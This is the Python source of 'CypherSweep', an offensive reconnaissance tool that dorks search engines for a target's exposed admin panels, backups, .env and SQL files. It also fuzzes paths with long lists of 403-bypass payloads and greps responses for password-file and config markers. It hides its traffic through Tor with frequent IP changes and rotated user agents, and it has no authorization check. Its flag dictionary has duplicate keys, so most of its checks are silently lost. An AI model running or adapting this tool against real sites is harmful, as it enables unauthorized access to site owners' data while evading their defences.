import requests
import threading
import random
import multiprocessing
import re
import time
import os
import subprocess
import urllib.parse
from stem import Signal
from stem.control import Controller
from pyfiglet import figlet_format
from termcolor import colored
from bs4 import BeautifulSoup

class CypherSweep:
    def __init__(self):
        self.TOR_PATH = os.path.join(os.path.dirname(__file__), "Torfolder", "tor", "tor.exe")
        self.torrc_path = os.path.join(os.path.dirname(__file__), "Torfolder", "torrc.txt")
        
        self.dorks = [  ("site:"," intitle:admin"),
                        ("site:"," inurl:backup"),
                        ("site:"," inurl:config"),
                        ("site:"," filetype:sql"),
                        ("site:"," filetype:bak"),
                        ("site:"," \"Index of /admin\""),
                        ("site:"," \"Index of /backup\""),
                        ("site:"," \"Index of /config\""),
                        ("site:"," \"Index of /log\""),
                        ("site:"," \"Index of /db\""),
                        ("site:"," error"),
                        ("site:"," warning"),
                        ("site:"," username password"),
                        ("site:"," admin login"),
                        ("site:"," inurl:.git"),
                        ("site:"," inurl:.svn"),
                        ("site:"," inurl:.htaccess"),
                        ("site:"," inurl:wp-content"),
                        ("site:"," inurl:phpinfo"),
                        ("site:"," inurl:shell"),
                        ("site:"," inurl:backdoor"),
                        ("site:"," inurl:debug"),
                        ("site:"," inurl:api"),
                        ("site:"," inurl:logs"),
                        ("site:"," filetype:env"),
                        ("site:"," filetype:cfg"),
                        ("site:"," filetype:conf"),
                        ("site:"," intext:\"Fatal error\""),
                        ("site:"," intext:\"database error\""),
                        ("site:"," intext:\"SQL syntax\""),
                        ("site:"," intitle:\"phpMyAdmin\""),
                        ("site:"," intitle:\"Welcome to phpMyAdmin\"")] 

        self.fuzz = [("/","/?"),("//","//"),("///","///"),("/./","/./"),("/","?"),("/","??"),("/","/?/"),("/","/??"),("/","/??/"),("/","/.."),("/","/../"),
                ("/","/./"),("/","/."),("/","/.//"),("/","/*"),("/","//*"),("/","/%2f"),("/","/%2f/"),("/","/%20"),("/","/%20/"),("/","/%09"),("/","/%09/"),
                ("/","/%0a"),("/","/%0a/"),("/","/%0d"),("/","/%0d/"),("/","/%25"),("/","/%25/"),("/","/%23"),("/","/%23"),("/","/%26"),("/","/%3f"),("/","/%3f/"),
                ("/","/%26/"),("/","/#"),("/","/#/"),("/","/#/./"),("/./",""),("/./","/"),("/..;/",""),("/..;/","/"),("/.;/",""),("/.;/","/"),("/;/",""),
                ("/;/","/"),("//;//",""),("//;//","/"),("/","/./"),("/%2e/",""),("/%2e/","/"),("/%20/","/%20"),("/%20/","/%20/"),("/","/..;/"),("/",".json"),
                ("/","/.json"),("/","..;/"),("/",";/"),("/","%00"),("/",".css"),("/",".html"),("/","?id=1"),("/","~"),("/","/~"),("/","/°/"),("/","/&"),
                ("/","/-"),("/","\\/\\/"),("/","/..%3B/"),("/","/;%2f..%2f..%2f"),("/","/..\\;/"),("/*/",""),("/*/","/"),("/",""),("/","/"),("/",""),("/","/")]
        
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        self.bypass_payloads = {
            "admin": [
                "//admin//", "///admin///", "/admin//login", "/admin///index",
                "/./admin/", "/admin/./login", "/admin/../admin/", "/././admin", "/admin/../../admin", "/admin/..;/", "/admin//../",
                "/%2e/admin/", "/admin%2f", "/admin%2e%2e/", "/%2e%2e/admin", "/admin%00", "/admin%09", "/admin\\/\\/", "/admin/%2e%2e/", "/%2e/admin%2e%2e",
                "/admin%20", "/admin%09", "/admin%0a", "/admin%0d", "/admin%25", "/admin%3f", "/admin%26", "/admin;%2f..%2f..%2f", "/..%3b/admin", "/admin;%00", "/admin/%00/",
                "/ADMIN", "/AdMiN", "/Adm%49n", "/admIN/", "/ADM+IN", "/admin~", "/admin/~", "/admin/°/", "/Admin./",
                "/admin.css", "/admin.html", "/admin.json", "/admin/.json", "/admin.php", "/admin.bak", "/admin.old", "/admin.inc", "/admin.asp", "/admin.aspx",
                "/admin?id=1", "/admin.php?debug=true", "/admin?access=granted", "/admin#", "/admin?redirect=/login", "/admin?.css", "/admin?user=admin&pass=admin",
                "/..;/admin", "/admin..;/", "/%2e%2e%2fadmin", "/%2e%2e/admin", "/%2e%2e/%2e%2e/admin", "/%252e%252e/%252e%252e/admin"
            ],
            "log": [
                "//logs//", "///logs///", "/log//", "/log///debug",
                "/./logs/", "/logs/./error", "/logs/../", "/././log", "/logs/../../", "/logs/..;/", "/logs//../",
                "/%2e/logs/", "/logs%2f", "/logs%2e%2e/", "/%2e%2e/logs", "/logs%00", "/logs%09", "/logs\\/\\/", "/logs/%2e%2e/", "/%2e/logs%2e%2e",
                "/logs%20", "/logs%09", "/logs%0a", "/logs%0d", "/logs%25", "/logs%3f", "/logs%26", "/logs;%2f..%2f..%2f", "/..%3b/logs", "/logs;%00", "/logs/%00/",
                "/LOGS", "/LoGs", "/Lo%47s", "/LOG+S", "/log~", "/logs/~", "/logs/°/", "/Logs./",
                "/error.log", "/access.log", "/debug.log", "/logs.php", "/logs.json", "/logs.txt", "/logs.tar.gz", "/logfile.bak",
                "/logs?type=debug", "/logs?download=1", "/logs?id=1", "/logs.php?dump=1", "/logs?.log", "/logs?user=admin&debug=true",
                "/..;/logs", "/logs..;/", "/%2e%2e%2flogs", "/%2e%2e/logs", "/%2e%2e/%2e%2e/logs", "/%252e%252e/%252e%252e/logs"
            ],
            "config": [
                "//config//", "///config///", "/config//settings", "/config///hidden",
                "/./config/", "/config/./", "/config/../", "/././config", "/config/../../", "/config/..;/", "/config//../",
                "/%2e/config/", "/config%2f", "/config%2e%2e/", "/%2e%2e/config", "/config%00", "/config%09", "/config\\/\\/", "/config/%2e%2e/", "/%2e/config%2e%2e",
                "/config%20", "/config%09", "/config%0a", "/config%0d", "/config%25", "/config%3f", "/config%26", "/config;%2f..%2f..%2f", "/..%3b/config", "/config;%00", "/config/%00/",
                "/CONFIG", "/ConfIg", "/CONF+IG", "/con%66ig", "/config~", "/config/~", "/config/°/", "/Config./",
                "/config.php", "/config.json", "/config.yaml", "/config.ini", "/config.xml", "/.env", "/wp-config.php", "/conf/settings.conf", "/config.bak",
                "/config?id=1", "/config?download=1", "/config?.json", "/config.php?debug=true",
                "/..;/config", "/config..;/", "/%2e%2e%2fconfig", "/%2e%2e/config", "/%2e%2e/%2e%2e/config", "/%252e%252e/%252e%252e/config"
            ],
            "backup": [
                "//backup//", "///backup///", "/backup//2023", "/backup///db",
                "/./backup/", "/backup/./", "/backup/../", "/././backup", "/backup/../../", "/backup/..;/", "/backup//../",
                "/%2e/backup/", "/backup%2f", "/backup%2e%2e/", "/%2e%2e/backup", "/backup%00", "/backup%09", "/backup\\/\\/", "/backup/%2e%2e/", "/%2e/backup%2e%2e",
                "/backup%20", "/backup%09", "/backup%0a", "/backup%0d", "/backup%25", "/backup%3f", "/backup%26", "/backup;%2f..%2f..%2f", "/..%3b/backup", "/backup;%00", "/backup/%00/",
                "/BACKUP", "/BackUp", "/BA+KUP", "/ba%63kup", "/backup~", "/backup/~", "/backup/°/", "/Backup./",
                "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/site_backup.sql", "/database_backup.bak", "/backup.json", "/backup.ini", "/backup.old", "/backup.bak", "/.backup",
                "/backup?id=1", "/backup?dl=1", "/backup.php?view=true", "/backup?.zip", "/backup?file=latest.sql",
                "/..;/backup", "/backup..;/", "/%2e%2e%2fbackup", "/%2e%2e/backup", "/%2e%2e/%2e%2e/backup", "/%252e%252e/%252e%252e/backup"
            ]
        }
        
        self.headers = [{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/110.0"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; U; Android 12; en-us; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:110.0) Gecko/20100101 Firefox/110.0"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/109.0"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.4 Mobile/15E148 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0 Safari/537.36"}] 
        
        self.vulnerable = []
        self.tried = set()
        self.threadsmain = []
        self.fuzzvuln = []
        self.threadsfuzz = []
        self.stop_event = threading.Event()
        self.flagwords = {"(Exposed directory)" :"Index of /", "(Exposed directory)" : "Directory listing for", "(Exposed directory)" :"Parent Directory", "(Exposed directory)" :".htaccess",
                    "(Exposed directory)" : "server-status", "(Linux password file)" : "root:x:0:0:", " (Windows boot file)" : "boot.ini" ,
                    "(Environment configuration file)" : ".env", "(Possible DB credentials)": "config.php", "(Exposed version control meta data)" : ".git",
                    "(Java app server config)" : "WEB-INF/web.xml", "(ASP.NET configuration)" : "appsettings.json", "(Django settings file)" : "local_settings.py",
                    "(Exposed admin endpoint)" : "/admin", "(Exposed admin endpoint)" : "/phpmyadmin", "(Exposed admin endpoint)" : "/wp-admin", "(Exposed debug endpoint)" : "/debug",
                    "(Exposed debug endpoint)" : "/dev", "(Exposed debug endpoint)" : "/config", "(Exposed debug endpoint)" : "/logs"}
        self.fuzztried = set()
        self.pattern = r"^(?:[a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,10}(?:$|\/)"
        self.lock = threading.Lock()
        self.n = multiprocessing.cpu_count()
        self.range1 = 20
        self.range2 = 30
        self.sweepbreadth = 13
        self.dorkcount = 0
        self.tor_process = None

    def change_ip(self):
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)  # Send NEWNYM signal to change the IP

    def displayprogress(self, tried, pool, threads_list):
        while any(thread.is_alive() for thread in threads_list):
            if len(pool) > 0:
                progress = (len(tried) / len(pool)) * 100
                print(f"Task progress {progress:.2f}% ")
            else:
                print("Waiting for tasks...")
            time.sleep(5)
        print("All threads completed!")

    def flagcatch(self, r, b):
        for key, value in self.flagwords.items():  
            if value.encode() in r.content:  
                with self.lock:
                    b[key] = r.url + " | " + value  


    def search(self, query):
        results = []
        query = urllib.parse.quote(query)
        max_retries = 3
        base_delay = 5  # seconds
        
        for attempt in range(max_retries):
            try:
                self.change_ip()
                
                # Randomize the search engine
                search_engines = [
                    f"https://www.google.com/search?q={query}&num={self.sweepbreadth}",
                    f"https://duckduckgo.com/html/?q={query}",
                    f"https://www.bing.com/search?q={query}&count={self.sweepbreadth}"
                ]
                url = random.choice(search_engines)
                headers = self.headers[random.randint(0, len(self.headers) - 1)]
                
                print(f"Searching for: {query} (Attempt {attempt+1})")
                
                response = requests.get(url, headers=headers, proxies=self.proxies, timeout=20)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    # Different selectors for different search engines
                    if "google.com" in url:
                        search_results = soup.select('div.g > div > div > div.yuRUbf > a, div.yuRUbf > a')
                    elif "duckduckgo.com" in url:
                        search_results = soup.select('a.result__a')
                    elif "bing.com" in url:
                        search_results = soup.select('li.b_algo h2 a')
                    else:
                        search_results = [a for a in soup.find_all('a') if 'href' in a.attrs 
                                        and a['href'].startswith('http')]
                    
                    for result in search_results:
                        href = result.get('href')
                        if href and href.startswith('http'):
                            results.append(href)
                    
                    if results:
                        return results
                    else:
                        print("No results found in HTML response.")
                
                elif response.status_code == 429:
                    delay = base_delay * (2 ** attempt)  # Exponential backoff
                    print(f"Rate limited (429). Waiting {delay} seconds before retry...")
                    time.sleep(delay)
                    continue
                else:
                    print(f"Search request failed with status code: {response.status_code}")
                    break
                    
            except Exception as e:
                print(f"Search attempt failed: {e}")
                delay = base_delay * (2 ** attempt)
                time.sleep(delay)
                
        print("All search attempts failed")
        return []
            
    def Vulnsearch(self):
        self.threadsmain = []
        self.stop_event.clear()  # Reset the flag at the start
        self.tried = set()
        self.vulnerable = []  # Reset vulnerable list
        self.dorkcount = 0
        flagscaught = {}
        fuzztried = []
        
        target = input("ENTER A DOMAIN: ")
        if bool(re.match(self.pattern, target)):
            inputval = "https://" + target

            try:
                requests.get(inputval, proxies=self.proxies, headers=self.headers[random.randint(0, len(self.headers) - 1)])
            except requests.exceptions.RequestException as e:
                print("could not resolve domain try again")
                return self.Vulnsearch()
            threadcount = self.n
        else:
            print("Invalid domain please try again")
            return self.Vulnsearch()
        
        # Create a shared counter for dorks processed across all threads
        dorks_per_thread = len(self.dorks) // threadcount
        if len(self.dorks) % threadcount != 0:
            dorks_per_thread += 1
        
    # Segment the dorks for each thread
        def task(target, flagscaught, tried, thread_id):
            start_idx = thread_id * dorks_per_thread
            end_idx = min(start_idx + dorks_per_thread, len(self.dorks))
            
            reqcount = 0
            rm = random.randint(self.range1, self.range2)
            rh = random.randint(0, len(self.headers)-1)
            
            # Process only this thread's segment of dorks
            for i in range(start_idx, end_idx):
                if self.stop_event.is_set():
                    return

                dork = self.dorks[i][0] + target + self.dorks[i][1]
                try:
                    tbt = self.search(dork)
                    
                    with self.lock:
                        self.dorkcount += 1
                        if self.dorkcount >= len(self.dorks):
                            self.stop_event.set()
                        print(f"Processed dork {self.dorkcount} of {len(self.dorks)}")
                    
                    if tbt and len(tbt) > 0:
                        for j in range(len(tbt)):
                            try:
                                vs = requests.get(tbt[j], headers=self.headers[rh], proxies=self.proxies)
                                reqcount += 1
                                if vs.status_code in [202, 200, 302]:
                                    with self.lock:
                                        self.vulnerable.append(tbt[j])
                                    self.flagcatch(vs, flagscaught)

                                elif vs.status_code == 403:
                                    self.change_ip()
                                    lastslash = 0
                                    t = tbt[j]
                                    for k in range(len(t)):
                                        if t[k] == "/":
                                            lastslash = k
                                    if lastslash == 5 or lastslash == 6:
                                        lastslash = 7
                                    core = t[lastslash + 1:len(t)]
                                    base = t[0:lastslash]
                                    rh = random.randint(0, len(self.headers)-1)
                                    rm = random.randint(self.range1, self.range2)
                                    for k in range(len(self.fuzz)):
                                        if self.stop_event.is_set():
                                            return
                                        if self.fuzz[k] not in fuzztried:
                                            with self.lock:
                                                fuzztried.append(self.fuzz[k])
                                            if k == len(self.fuzz) - 4 or k == len(self.fuzz) - 3:
                                                fuzzatt = "https://" + base + self.fuzz[k][0] + core.upper() + self.fuzz[k][1]
                                            elif k == len(self.fuzz) - 2 or k == len(self.fuzz) - 1:
                                                coreup = core.upper()
                                                fuzzatt = "https://" + base + self.fuzz[k][0] + coreup[0:(len(coreup) - 1) // 2] + "+" + coreup[(len(coreup) - 1) // 2: len(coreup)] + self.fuzz[k][1]
                                            else:
                                                fuzzatt = "https://" + base + self.fuzz[k][0] + core + self.fuzz[k][1]
                                            try:
                                                ff = requests.get(fuzzatt, headers=self.headers[rh], proxies=self.proxies)
                                                reqcount += 1 
                                                if ff.status_code in [202, 200, 302]:
                                                    with self.lock:
                                                        self.vulnerable.append(fuzzatt)
                                                    self.flagcatch(ff, flagscaught)
                                            except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
                                                print(f"403 fuzz attempt failed: {e}")
                                                self.stop_event.set()
                                                return
                                            if reqcount >= rm:
                                                reqcount = 0
                                                self.change_ip()
                                                rh = random.randint(0, len(self.headers)-1)
                                                rm = random.randint(self.range1, self.range2)

                            except(KeyboardInterrupt, requests.exceptions.RequestException) as e:
                                print(f"Request failed or interrupted for {dork}: {e}")
                                self.stop_event.set()
                                return
                except Exception as e:
                    print(f"Error processing dork {dork}: {e}")
                    with self.lock:
                        self.dorkcount += 1  # Count this as processed even if it failed
                        if self.dorkcount >= len(self.dorks):
                            self.stop_event.set()
        def modified_display_progress():
            check_interval = 2  # seconds
            last_count = 0
            stall_counter = 0
            max_stalls = 5  # After this many stalls, assume the process is stuck
            
            while not self.stop_event.is_set() and any(thread.is_alive() for thread in self.threadsmain):
                progress = (self.dorkcount / len(self.dorks)) * 100
                print(f"Task progress {progress:.2f}% ({self.dorkcount}/{len(self.dorks)} dorks)")
                
                # Check for stalls (no progress over multiple checks)
                if self.dorkcount == last_count:
                    stall_counter += 1
                    if stall_counter >= max_stalls:
                        print("Progress appears stalled. Setting stop event.")
                        self.stop_event.set()
                        break
                else:
                    stall_counter = 0
                    
                last_count = self.dorkcount
                time.sleep(check_interval)
    
            print("Progress monitoring completed")
        
        for i in range(threadcount):
            thread = threading.Thread(target=task, args=(target, flagscaught, self.tried, i))
            thread.start()
            with self.lock:
                self.threadsmain.append(thread)

        # Start progress thread with stall detection
        progress_thread = threading.Thread(target=modified_display_progress)
        progress_thread.daemon = True
        progress_thread.start()

        # Set a timeout for the overall process
        timeout = 300  # 5 minutes
        start_time = time.time()
        
        # Wait for threads to complete or timeout
        while any(thread.is_alive() for thread in self.threadsmain):
            if time.time() - start_time > timeout:
                print("Operation timed out. Terminating.")
                self.stop_event.set()
                break
            time.sleep(1)

        # Ensure stop event is set before exiting
        self.stop_event.set()
        
        print("Scan completed")
        print(f"Vulnerable URL's: {self.vulnerable}")
        print(f"Other flagged Vulns: {flagscaught}")
        
        return self.mainmenu()


    def bypass(self):
        self.stop_event.clear()
        flagscaught = {}
        self.threadsfuzz = []
        fuzztried = []
        target = input("ENTER 403 DOMAIN: ")
        if bool(re.match(self.pattern, target)):
            inputval = "https://" + target
            try:
                iv = requests.get(inputval, proxies=self.proxies, headers=self.headers[random.randint(0, len(self.headers) - 1)])
            except requests.exceptions.RequestException as e:
                print("could not resolve domain try again")
                return self.bypass()
            
            threadcount = self.n
        else:
            print("Invalid domain please try again")
            return self.bypass()
            
        def task2(target, flagscaught):
            reqcount = 0
            self.change_ip()
            lastslash = 0
            for i in range(len(target)):
                if target[i] == "/":
                    lastslash = i
            if lastslash == 5 or lastslash == 6:
                lastslash = 7
            core = target[lastslash + 1:len(target)]
            base = target[0:lastslash]
            rh = random.randint(0, len(self.headers)-1)
            rm = random.randint(self.range1, self.range2)
            for i in range(len(self.fuzz)):
                if self.stop_event.is_set():
                    return
                if self.fuzz[i] not in fuzztried:
                    with self.lock:
                        fuzztried.append(self.fuzz[i])
                    if i == len(self.fuzz) - 4 or i == len(self.fuzz) - 3:
                        fuzzatt = "https://" + base + self.fuzz[i][0] + core.upper() + self.fuzz[i][1]
                    elif i == len(self.fuzz) - 2 or i == len(self.fuzz) - 1:
                        coreup = core.upper()
                        fuzzatt = "https://" + base + self.fuzz[i][0] + coreup[0:(len(coreup) - 1) // 2] + "+" + coreup[(len(coreup) - 1) // 2: len(coreup)] + self.fuzz[i][1]
                    else:
                        fuzzatt = "https://" + base + self.fuzz[i][0] + core + self.fuzz[i][1]
                    try:
                        ff = requests.get(fuzzatt, headers=self.headers[rh], proxies=self.proxies)
                        reqcount +=1 
                        if ff.status_code in [202,200,302]:
                            with self.lock:
                                self.vulnerable.append(fuzzatt)
                            self.flagcatch(ff, flagscaught)
                    except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
                        print(f"403 fuzz attempt failed: {e}")
                        self.stop_event.set()
                        self.mainmenu()
                    if reqcount >= rm:
                        reqcount = 0
                        self.change_ip()
                        rh = random.randint(0, len(self.headers)-1)
                        rm = random.randint(self.range1, self.range2)

                
        for i in range(threadcount):
            thread = threading.Thread(target=task2, args=(target, flagscaught))
            thread.start()
            with self.lock:
                self.threadsfuzz.append(thread)

        progress_thread = threading.Thread(target=self.displayprogress, args=(fuzztried, self.fuzz, self.threadsfuzz))
        progress_thread.daemon = True
        progress_thread.start()

        for thread in self.threadsfuzz:
            thread.join()
        
        print(f"Vulnerable URL's: {self.vulnerable}")
        print(f"Other flagged Vulns: {flagscaught}")
        
    def responseanalyze(self):
        flagscaught = {}
        target = input("ENTER DOMAIN: ")
        count = 0
        if bool(re.match(self.pattern, target)):
            inputval = "https://" + target
            try:
                iv = requests.get(inputval, proxies=self.proxies, headers=self.headers[random.randint(0, len(self.headers) - 1)])
            except requests.exceptions.RequestException as e:
                print("could not resolve domain try again")
                return self.responseanalyze()
        else:
            print("Invalid domain please try again")
            return self.responseanalyze()
        try:
            for key, value in self.flagwords.items():
                count +=1  
                if value.encode() in iv.content:  
                        progress = (count // len(self.flagwords)) * 100
                        if count % 5 == 0:
                            print(f"Scan progress {progress}%")

                        flagscaught[key] = iv.url + " | " + value
        except(KeyboardInterrupt, requests.exceptions.RequestException):
            print("Keyboard interrupt returning to menu")
            return self.mainmenu()

        print(f"Flagged vulnerabilities: {flagscaught}")

    def helpmenu(self):
        print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
        print("                                                                                                                                               By Michael Ajilore")
        ascii_art = figlet_format("CypherSweep", font="slant")

        print(colored(ascii_art, "yellow"))
        print("Option 1 to start Vulnerability search")
        print("Option 2 to start 403 Bypass")
        print("Option 3 to analyze HTTP response")
        print("Option 4 for help menu")
        print("Option 5 for settings")
        print(" ")
        print("Use Crtl + C to back out of any scan")
        print("Please ensure your device has nothing running on port 9050 or 9051 ")
        print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
        x = int(input("choose any number to return to main menu: "))
        if x >= 0:
            self.mainmenu()

    def mainmenu(self):
        print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
        print("                                                                                                                                               By Michael Ajilore")
        ascii_art = figlet_format("CypherSweep", font="slant")
        print(colored(ascii_art, "yellow"))
        print("(1) Vulnerability Search")
        print("(2) 403 Bypass")
        print("(3) Scan HTTP response")
        print("(4) Help menu                                                                                                   This war's a people's war against a system that's")
        print("(5) Settings                                                                                                    spiralled outta our control                      ")
        print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
        user = input()

        if user == "1":
            self.Vulnsearch()
        elif user == "2":
            self.bypass()
        elif user == "3":
            self.responseanalyze()
        elif user == "4":
            self.helpmenu()
        elif user == "5":
            self.Settings()
        else:
            self.mainmenu()

    def Settings(self):
        print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
        print(" ")
        print("(1) Set Thread Count")
        print("(2) Set Rate limiting")
        print("(3) Set Scan Breadth")
        print("(4) Main menu")
        print(" ")
        print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
        q = input()
        if q == "1":
            self.threadcont()
        elif q == "2":
            self.ratelimitcont()
        elif q == "3":
            self.breadthcont()
        elif q == "4":
            self.mainmenu()
        else:
            self.mainmenu()
    
    def threadcont(self):
        print(f"Current Thread Count:{self.n}")
        i = input("Enter 1 for set threads | Enter 2 to optimize threads to your system :")
        if i == "1":
            k = int(input("enter desired thread count :"))
            self.n = k
        elif i == "2":
            self.n = multiprocessing.cpu_count()
        return self.mainmenu()

    def ratelimitcont(self):
        print(f"Current Range : {self.range1},{self.range2}")
        i = input("Enter 1 to set rate limit range | Enter 2 for suggested range :")
        if i == "1":
            k = input("Enter desired range (e.g., 50 70): ")
            try:
                self.range1, self.range2 = map(int, k.split(" "))
            except ValueError:
                print("Invalid input. Please enter two numbers separated by a space.")
                return self.ratelimitcont()
        elif i == "2":
            self.range1 = 20
            self.range2 = 30
        return self.mainmenu()
    
    def breadthcont(self):
        print(f"Current Scan Breadth : {self.sweepbreadth}")
        i = input("Enter 1 to set Scan breadth range | Enter 2 for suggested breadth range :")
        if i == "1":
            q = int(input("Enter desired scan breadth : "))
            self.sweepbreadth = q

        elif i == "2":
            self.sweepbreadth = 13
        
        return self.mainmenu()
    
    
    def start_tor(self):
        print("Loading please wait")

        self.tor_process = subprocess.Popen(
            [self.TOR_PATH, "-f", self.torrc_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        time.sleep(5)
        self.change_ip()

def main():
    # Create an instance of the CypherSweep class and start the program
    sweep = CypherSweep()
    sweep.start_tor()
    sweep.mainmenu()

if __name__ == "__main__":
    main()